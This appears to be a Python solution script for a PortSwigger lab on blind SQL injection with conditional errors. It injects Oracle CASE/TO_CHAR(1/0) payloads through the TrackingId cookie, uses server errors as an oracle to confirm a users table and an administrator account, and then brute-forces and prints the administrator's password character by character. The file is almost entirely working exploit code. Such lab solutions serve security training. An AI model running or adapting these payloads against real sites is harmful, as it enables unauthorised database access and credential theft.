# lab link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import urllib3
import requests
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
  'http': '127.0.0.1:8080',
  'https': '127.0.0.1:8080'
}
client = None
tracking_cookie = None
host = None

def send_request(payload):
  client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
  response = client.get(f'{host}')
  if response.status_code == 500:
    return True
  return False

def retreive_tracking_cookie():
  global tracking_cookie

  response = client.get(f'{host}')
  tracking_cookie = response.cookies.get('TrackingId')
  if tracking_cookie:
    print(f'(+) Tracking cookie found: {tracking_cookie}')
  else:
    print(f'(+) Tracking cookie not found!')
    sys.exit(-2)

def confirm_injection():
  # Must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"):
    print('(-) Invalid Payload')
    sys.exit(-2)
  print('(+) Injection Confirmed')

  # Must not return an error
  if send_request("'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"):
    # if it does
    print('(-) Invalid Payload')
    sys.exit(-2)
  print('(+) Injection Confirmed')
  
  # Checking the presence of users table: must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM = 1)||'"):
    print('(-) users table not found!')
    sys.exit(-2)
  print('(+) users table found.')
  
  # Checking the presence of username 'administrator': must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
    print('(-) username:administrator not found!')
    sys.exit(-2)
  print('(+) username:administrator found!')

def get_password_length():
  for i in range(1, 100):
    if send_request(f"'||(SELECT CASE WHEN (LENGTH(password)={i}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
      return i
  print('(-) Password length can not be found')
  sys.exit(-2)

def retreive_admin_password(password_length):
  password = ''

  # Since the lab has stated that the password contain only lowercase alphanumeric characters, this shortens our scope of brute-force
  # Numbers ASCII range: (48, 57+1) & lowercase letter ASCII range: (97, 122+1)

  ascii_chars_positions = [num for num in range(48, 58)] + [num for num in range(97, 123)]
  total_combinations = len(ascii_chars_positions)*password_length
  print(f'(+) Starting password enumeration \nTotal requests to be sent: {total_combinations}')

  sys.stdout.write('\r[] Current Extraction Status: ')
  sys.stdout.flush()

  req_count = 0
  for i in range(1, password_length+1):
    for j in ascii_chars_positions:
      if send_request(f"'||(SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{chr(j)}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
        password += chr(j)
        break
      req_count += 1
    sys.stdout.write('\r[ ] Current extraction status: ' + password)
    sys.stdout.flush()

    if len(password) == password_length:
      print()
      print(f'Total requests made: {req_count}')
      return password
  
  print('Failed!')
  sys.exit(-1)

if __name__ == '__main__':
  try:
    host = sys.argv[1].strip().rstrip('/')
  except IndexError:
    print(f'(+) Usage: {sys.argv[0]} <HOST>')
    print(f'(+) Example: {sys.argv[0]} http://www.example.com')
    sys.exit(-1)

  with requests.Session() as client:
    client.verify = False
    client.proxies = proxies
    retreive_tracking_cookie()
    confirm_injection()

    password_length = get_password_length()
    print(f'[+] Found password length: {password_length}')

    admin_password = retreive_admin_password(password_length)
    print(f'[+] Found administrator password: {admin_password}')